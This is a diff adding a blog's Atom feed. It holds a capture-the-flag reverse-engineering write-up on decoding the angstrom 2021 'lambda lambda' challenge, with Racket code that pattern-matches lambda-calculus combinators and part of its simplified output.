@@ -1,0 +1,1350 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-10-26T21:15:56-07:00</updated><id>/feed.xml</id><title type="html">Cheuk’s Blog</title><entry><title type="html">lambda lambda - angstrom 2021</title><link href="/writeup/2021/04/07/lambda-angstrom2021.html" rel="alternate" type="text/html" title="lambda lambda - angstrom 2021" /><published>2021-04-07T12:06:00-07:00</published><updated>2021-04-07T12:06:00-07:00</updated><id>/writeup/2021/04/07/lambda-angstrom2021</id><content type="html" xml:base="/writeup/2021/04/07/lambda-angstrom2021.html"><![CDATA[<blockquote>
+  <p><strong>lambda lambda</strong> [rev 130 points]</p>
+
+  <p>lambda lambda lambda…. <a href="/res/ctf-static/angstrom2021-lambda.py">lambda</a>?</p>
+
+  <p><code class="language-plaintext highlighter-rouge">2692665569775536810618960607010822800159298089096272924</code></p>
+
+  <p>hint: Ever hear about lambda calculus?</p>
+</blockquote>
+
+<p>With my 2 semesters worth of experience in programming languages and compiler construction in Racket, I
+thought I had the necessary skills to take this on. Here are the 2 approaches I took:</p>
+
+<ol>
+  <li><strong><a href="#analysis">Analysis</a>.</strong> By analyzing the lambdas in the code, I hoped to gain some understanding of
+what the code actually did. <a href="#analysis">Static</a> and <a href="#dynamic-analysis">Dynamic</a> were used.</li>
+  <li><strong><a href="#brute-force">Brute force</a>.</strong> By guessing what the lambdas did, I treated the code as an oracle and
+brute-forced a byte-by-byte decryption.</li>
+</ol>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>There are 2 types of analysis you can do on this code: static analysis and dynamic analysis. For static
+analysis, I used Racket library <code class="language-plaintext highlighter-rouge">python</code> to parse the syntax and isolate the lambdas. I translated these
+from the library’s format into actual lambdas and did pattern matching on the terms. For instance, if we
+encounter the pattern <code class="language-plaintext highlighter-rouge">(lambda (x) x)</code>, we identify it as the <code class="language-plaintext highlighter-rouge">identity</code> function. Another example would
+be the Y-combinator, which does recursion by what I learned as “just-in-time” environment substitution.
+Here’s the function for this kind of pattern recognition:</p>
+
+<div class="language-racket highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">;; Do pattern matching on the program</span>
+<span class="p">(</span><span class="k">define</span> <span class="p">(</span><span class="nf">optimize-lambdas</span> <span class="nv">x</span><span class="p">)</span>
+  <span class="p">(</span><span class="k">define</span> <span class="p">(</span><span class="nf">-opt</span> <span class="nv">x</span><span class="p">)</span>
+    <span class="p">(</span><span class="nf">match</span> <span class="nv">x</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="ss">'identity</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="nb">+</span> <span class="o">,</span><span class="nv">a</span> <span class="mi">1</span><span class="p">))</span> <span class="ss">'add1</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span> <span class="o">,</span><span class="nv">a</span><span class="p">)))</span> <span class="ss">'reverse-args</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="o">,</span><span class="nv">a</span><span class="p">))</span> <span class="ss">'sel1</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">))</span> <span class="ss">'sel2</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">n</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)))</span> <span class="ss">'sel3</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">g</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span> <span class="p">((</span><span class="o">,</span><span class="nv">g</span> <span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)))))</span> <span class="ss">'X</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">a</span> <span class="nv">X</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)))</span> <span class="ss">'aXb</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">g</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span> <span class="o">,</span><span class="nv">g</span><span class="p">)))))</span> <span class="ss">'abg</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">g</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">e</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span> <span class="p">(((</span><span class="o">,</span><span class="nv">g</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">p</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">q</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">q</span> <span class="p">(</span><span class="o">,</span><span class="nv">p</span> <span class="o">,</span><span class="nv">e</span><span class="p">)))))</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">n</span><span class="p">)</span> <span class="o">,</span><span class="nv">f</span><span class="p">))</span> <span class="nv">identity</span><span class="p">))))</span>
+        <span class="ss">'fun1</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">b</span> <span class="nv">fun1</span><span class="p">)</span> <span class="o">,</span><span class="nv">a</span><span class="p">)))</span> <span class="ss">'fun2</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">a</span> <span class="nv">sel3</span><span class="p">)</span> <span class="nv">sel1</span><span class="p">))</span> <span class="ss">'fun31</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">a</span> <span class="nv">sel2</span><span class="p">)</span> <span class="nv">sel1</span><span class="p">))</span> <span class="ss">'fun21</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="p">(</span><span class="nf">fun31</span> <span class="p">((</span><span class="nf">fun2</span> <span class="p">(</span><span class="nf">X</span> <span class="o">,</span><span class="nv">a</span><span class="p">))</span> <span class="o">,</span><span class="nv">b</span><span class="p">))))</span> <span class="ss">'fun4</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span>
+           <span class="p">((</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x1</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x2</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">x1</span> <span class="o">,</span><span class="nv">x1</span><span class="p">)</span> <span class="o">,</span><span class="nv">x2</span><span class="p">))))</span>
+            <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x3</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x4</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">x3</span> <span class="o">,</span><span class="nv">x3</span><span class="p">)</span> <span class="o">,</span><span class="nv">x4</span><span class="p">))))))</span>
+        <span class="ss">'Y</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span>
+           <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x</span><span class="p">)</span>
+              <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="o">,</span><span class="nv">x</span><span class="p">))))))))))))))))))</span>
+        <span class="ss">'apply-16-times</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x</span><span class="p">)</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="o">,</span><span class="nv">x</span><span class="p">))))</span>
+        <span class="ss">'apply-2-times</span><span class="p">]</span>
+
+      <span class="p">[</span><span class="o">`</span><span class="p">((</span><span class="nf">reverse-args</span> <span class="nv">apply-2-times</span><span class="p">)</span> <span class="o">,</span><span class="nv">x</span><span class="p">)</span>
+        <span class="o">`</span><span class="p">(</span><span class="o">,</span><span class="nv">x</span> <span class="nv">apply-2-times</span><span class="p">)]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">((</span><span class="nf">sel1</span> <span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="nv">a</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">((</span><span class="nf">sel2</span> <span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="nv">b</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(((</span><span class="nf">sel3</span> <span class="o">,</span><span class="nv">n</span><span class="p">)</span> <span class="o">,</span><span class="nv">a</span><span class="p">)</span> <span class="o">,</span><span class="nv">b</span><span class="p">)</span> <span class="nv">b</span><span class="p">]</span>
+
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">file</span><span class="p">)</span>
+           <span class="p">((</span><span class="nf">Y</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">t</span><span class="p">)</span> <span class="p">((</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">not-cond</span><span class="p">)</span> <span class="p">(</span><span class="k">if</span> <span class="p">(</span><span class="nb">not</span> <span class="o">,</span><span class="nv">not-cond</span><span class="p">)</span> <span class="o">,</span><span class="nv">t</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span> <span class="p">(</span><span class="nf">X</span> <span class="o">,</span><span class="nv">t</span><span class="p">))))</span>
+                                       <span class="p">(</span><span class="nb">read</span> <span class="o">,</span><span class="nv">file</span> <span class="mi">1000</span><span class="p">)))))</span>
+            <span class="nv">sel2</span><span class="p">))</span>
+        <span class="ss">'read-1000</span><span class="p">]</span>
+      <span class="p">[</span><span class="o">`</span><span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">x</span><span class="p">)</span>
+           <span class="p">((</span><span class="nf">Y</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f-f</span><span class="p">)</span> <span class="p">(</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">X-F</span><span class="p">)</span>
+                                <span class="p">(</span><span class="k">if</span> <span class="p">(</span><span class="nb">eq?</span> <span class="p">((</span><span class="k">λ</span> <span class="p">(</span><span class="o">,</span><span class="nv">f</span><span class="p">)</span> <span class="p">((</span><span class="o">,</span><span class="nv">f</span> <span class="nv">add1</span><span class="p">)</span> <span class="mi">0</span><span class="p">))</span> <span class="o">,</span><span class="nv">X-F</span><span class="p">)</span> <span class="o">,</span><span class="nv">x</span><span class="p">)</span>
+                                  <span class="o">,</span><span class="nv">X-F</span>
+                                  <span class="p">(</span><span class="o">,</span><span class="nv">f-f</span> <span class="p">(</span><span class="nf">X</span> <span class="o">,</span><span class="nv">X-F</span><span class="p">))))))</span>
+            <span class="nv">identity</span><span class="p">))</span>
+        <span class="ss">'main</span><span class="p">]</span>
+
+      <span class="p">[</span><span class="o">`</span><span class="p">((</span><span class="nf">get-field</span> <span class="nv">read</span> <span class="o">,</span><span class="nv">x</span><span class="p">)</span> <span class="o">,</span><span class="nv">num</span><span class="p">)</span> <span class="nt">#:when</span> <span class="p">(</span><span class="nb">number?</span> <span class="nv">num</span><span class="p">)</span> <span class="o">`</span><span class="p">(</span><span class="nb">read</span> <span class="o">,</span><span class="nv">x</span> <span class="o">,</span><span class="nv">num</span><span class="p">)]</span>
+      <span class="p">[</span><span class="nf">exprs</span> <span class="nt">#:when</span> <span class="p">(</span><span class="nb">list?</span> <span class="nv">exprs</span><span class="p">)</span> <span class="p">(</span><span class="nb">map</span> <span class="nv">-opt</span> <span class="nv">exprs</span><span class="p">)]</span>
+      <span class="p">[</span><span class="nf">else</span> <span class="nv">x</span><span class="p">]))</span>
+
+  <span class="p">(</span><span class="nf">-opt</span> <span class="p">(</span><span class="nf">-opt</span> <span class="p">(</span><span class="nf">-opt</span> <span class="p">(</span><span class="nf">-opt</span> <span class="p">(</span><span class="nf">-opt</span> <span class="nv">x</span><span class="p">))))))</span>
+</code></pre></div></div>
+
+<p>Output (click <a href="#end-of-output">here</a> to skip to the bottom of the output):</p>
+
+<div class="language-lisp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(((((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g176</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g177</span><span class="p">)</span>
+        <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g178</span><span class="p">)</span>
+          <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g179</span><span class="p">)</span>
+            <span class="p">(((</span><span class="nv">Y</span>
+               <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g185</span><span class="p">)</span>
+                 <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g186</span><span class="p">)</span>
+                   <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g187</span><span class="p">)</span>
+                     <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g188</span><span class="p">)</span>
+                         <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g189</span><span class="p">)</span>
+                           <span class="p">(</span><span class="k">if</span> <span class="p">(</span><span class="nb">not</span> <span class="nv">g188</span><span class="p">)</span>
+                             <span class="nv">g186</span>
+                             <span class="p">((</span><span class="nv">g185</span>
+                               <span class="p">(</span><span class="nb">+</span>
+                                <span class="p">(</span><span class="nb">*</span> <span class="nv">g186</span> <span class="mi">256</span><span class="p">)</span>
+                                <span class="p">((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g190</span><span class="p">)</span> <span class="p">((</span><span class="nv">g190</span> <span class="nv">add1</span><span class="p">)</span> <span class="mi">0</span><span class="p">))</span>
+                                 <span class="p">((</span><span class="nv">aXb</span> <span class="nv">g178</span><span class="p">)</span>
+                                  <span class="p">((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g197</span><span class="p">)</span>
+                                     <span class="p">((</span><span class="nv">aXb</span>
+                                       <span class="p">((</span><span class="nv">abg</span>
+                                         <span class="p">(((</span><span class="nv">Y</span>
+                                            <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g211</span><span class="p">)</span>
+                                              <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g212</span><span class="p">)</span>
+                                                <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g213</span><span class="p">)</span>
+                                                  <span class="p">(((((</span><span class="nv">fun4</span> <span class="nv">g212</span><span class="p">)</span> <span class="nv">g213</span><span class="p">)</span>
+                                                     <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g234</span><span class="p">)</span> <span class="nv">g212</span><span class="p">))</span>
+                                                    <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g235</span><span class="p">)</span>
+                                                      <span class="p">((</span><span class="nv">g211</span>
+                                                        <span class="p">((</span><span class="nv">fun2</span> <span class="nv">g212</span><span class="p">)</span> <span class="nv">g213</span><span class="p">))</span>
+                                                       <span class="nv">g213</span><span class="p">)))</span>
+                                                   <span class="nv">sel2</span><span class="p">)))))</span>
+                                           <span class="nv">g197</span><span class="p">)</span>
+                                          <span class="nv">apply-16-times</span><span class="p">))</span>
+                                        <span class="nv">apply-16-times</span><span class="p">))</span>
+                                      <span class="p">(((</span><span class="nv">Y</span>
+                                         <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g256</span><span class="p">)</span>
+                                           <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g257</span><span class="p">)</span>
+                                             <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g258</span><span class="p">)</span>
+                                               <span class="p">(((((</span><span class="nv">fun4</span> <span class="nv">g257</span><span class="p">)</span> <span class="nv">g258</span><span class="p">)</span> <span class="nv">sel3</span><span class="p">)</span>
+                                                 <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g282</span><span class="p">)</span>
+                                                   <span class="p">(</span><span class="nv">X</span>
+                                                    <span class="p">((</span><span class="nv">g256</span> <span class="p">((</span><span class="nv">fun2</span> <span class="nv">g257</span><span class="p">)</span> <span class="nv">g258</span><span class="p">))</span>
+                                                     <span class="nv">g258</span><span class="p">))))</span>
+                                                <span class="nv">sel2</span><span class="p">)))))</span>
+                                        <span class="nv">g197</span><span class="p">)</span>
+                                       <span class="nv">apply-16-times</span><span class="p">)))</span>
+                                   <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g299</span><span class="p">)</span>
+                                       <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g300</span><span class="p">)</span>
+                                         <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g301</span><span class="p">)</span>
+                                             <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g302</span><span class="p">)</span>
+                                               <span class="p">(((((</span><span class="nv">Y</span>
+                                                    <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g308</span><span class="p">)</span>
+                                                      <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g309</span><span class="p">)</span>
+                                                        <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g310</span><span class="p">)</span>
+                                                          <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g311</span><span class="p">)</span>
+                                                            <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g312</span><span class="p">)</span>
+                                                              <span class="p">((((((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g313</span><span class="p">)</span>
+                                                                     <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g314</span><span class="p">)</span>
+                                                                       <span class="p">((</span><span class="nv">g313</span>
+                                                                         <span class="nv">sel1</span><span class="p">)</span>
+                                                                        <span class="nv">g314</span><span class="p">)))</span>
+                                                                   <span class="p">(</span><span class="nv">g301</span>
+                                                                    <span class="nv">g310</span><span class="p">))</span>
+                                                                  <span class="p">(</span><span class="nv">g301</span> <span class="nv">g311</span><span class="p">))</span>
+                                                                 <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g317</span><span class="p">)</span>
+                                                                   <span class="p">(((</span><span class="nv">g301</span>
+                                                                      <span class="nv">g310</span><span class="p">)</span>
+                                                                     <span class="p">((</span><span class="nv">aXb</span>
+                                                                       <span class="nv">g309</span><span class="p">)</span>
+                                                                      <span class="p">((</span><span class="nv">g302</span>
+                                                                        <span class="nv">g311</span><span class="p">)</span>
+                                                                       <span class="p">(</span><span class="nv">g312</span>
+                                                                        <span class="nv">apply-2-times</span><span class="p">))))</span>
+                                                                    <span class="p">((</span><span class="nv">aXb</span>
+                                                                      <span class="nv">g309</span><span class="p">)</span>
+                                                                     <span class="p">((</span><span class="nv">g302</span>
+                                                                       <span class="nv">g310</span><span class="p">)</span>
+                                                                      <span class="p">(</span><span class="nv">g312</span>
+                                                                       <span class="nv">apply-2-times</span><span class="p">))))))</span>
+                                                                <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g336</span><span class="p">)</span>
+                                                                  <span class="p">((((</span><span class="nv">g308</span>
+                                                                      <span class="p">((</span><span class="nv">aXb</span>
+                                                                        <span class="nv">g309</span><span class="p">)</span>
+                                                                       <span class="p">((</span><span class="nv">g302</span>
+                                                                         <span class="p">(</span><span class="nv">g312</span>
+                                                                          <span class="nv">apply-2-times</span><span class="p">))</span>
+                                                                        <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g346</span><span class="p">)</span>
+                                                                            <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g347</span><span class="p">)</span>
+                                                                              <span class="p">(((((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g348</span><span class="p">)</span>
+                                                                                    <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g349</span><span class="p">)</span>
+                                                                                      <span class="p">((</span><span class="nv">g348</span>
+                                                                                        <span class="nv">sel1</span><span class="p">)</span>
+                                                                                       <span class="nv">g349</span><span class="p">)))</span>
+                                                                                  <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g352</span><span class="p">)</span>
+                                                                                      <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g353</span><span class="p">)</span>
+                                                                                        <span class="p">((</span><span class="nv">g352</span>
+                                                                                          <span class="nv">g353</span><span class="p">)</span>
+                                                                                         <span class="nv">sel2</span><span class="p">)))</span>
+                                                                                    <span class="p">(</span><span class="nv">g301</span>
+                                                                                     <span class="nv">g346</span><span class="p">))</span>
+                                                                                   <span class="p">(</span><span class="nv">fun21</span>
+                                                                                    <span class="p">(</span><span class="nv">g301</span>
+                                                                                     <span class="nv">g347</span><span class="p">))))</span>
+                                                                                 <span class="p">(((</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g361</span><span class="p">)</span>
+                                                                                     <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g362</span><span class="p">)</span>
+                                                                                       <span class="p">((</span><span class="nv">g361</span>
+                                                                                         <span class="nv">g362</span><span class="p">)</span>
+                                                                                        <span class="nv">sel2</span><span class="p">)))</span>
+                                                                                   <span class="p">(</span><span class="nv">g301</span>
+                                                                                    <span class="nv">g347</span><span class="p">))</span>
+                                                                                  <span class="p">(</span><span class="nv">fun21</span>
+                                                                                   <span class="p">(</span><span class="nv">g301</span>
+                                                                                    <span class="nv">g346</span><span class="p">))))</span>
+                                                                                <span class="nb">identity</span><span class="p">)</span>
+                                                                               <span class="nv">sel2</span><span class="p">)))</span>
+                                                                          <span class="p">(((</span><span class="nv">Y</span>
+                                                                             <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g378</span><span class="p">)</span>
+                                                                               <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g379</span><span class="p">)</span>
+                                                                                 <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g380</span><span class="p">)</span>
+                                                                                   <span class="p">(((((</span><span class="nv">fun4</span>
+                                                                                        <span class="nv">g379</span><span class="p">)</span>
+                                                                                       <span class="nv">g380</span><span class="p">)</span>
+                                                                                      <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g401</span><span class="p">)</span>
+                                                                                        <span class="nv">g379</span><span class="p">))</span>
+                                                                                     <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g402</span><span class="p">)</span>
+                                                                                       <span class="p">((</span><span class="nv">g378</span>
+                                                                                         <span class="p">((</span><span class="nv">fun2</span>
+                                                                                           <span class="nv">g379</span><span class="p">)</span>
+                                                                                          <span class="nv">g380</span><span class="p">))</span>
+                                                                                        <span class="nv">g380</span><span class="p">)))</span>
+                                                                                    <span class="nv">sel2</span><span class="p">)))))</span>
+                                                                            <span class="nv">g310</span><span class="p">)</span>
+                                                                           <span class="nv">apply-2-times</span><span class="p">))</span>
+                                                                         <span class="p">(((</span><span class="nv">Y</span>
+                                                                            <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g421</span><span class="p">)</span>
+                                                                              <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g422</span><span class="p">)</span>
+                                                                                <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g423</span><span class="p">)</span>
+                                                                                  <span class="p">(((((</span><span class="nv">fun4</span>
+                                                                                       <span class="nv">g422</span><span class="p">)</span>
+                                                                                      <span class="nv">g423</span><span class="p">)</span>
+                                                                                     <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g444</span><span class="p">)</span>
+                                                                                       <span class="nv">g422</span><span class="p">))</span>
+                                                                                    <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g445</span><span class="p">)</span>
+                                                                                      <span class="p">((</span><span class="nv">g421</span>
+                                                                                        <span class="p">((</span><span class="nv">fun2</span>
+                                                                                          <span class="nv">g422</span><span class="p">)</span>
+                                                                                         <span class="nv">g423</span><span class="p">))</span>
+                                                                                       <span class="nv">g423</span><span class="p">)))</span>
+                                                                                   <span class="nv">sel2</span><span class="p">)))))</span>
+                                                                           <span class="nv">g311</span><span class="p">)</span>
+                                                                          <span class="nv">apply-2-times</span><span class="p">)))))</span>
+                                                                     <span class="p">(((</span><span class="nv">Y</span>
+                                                                        <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g464</span><span class="p">)</span>
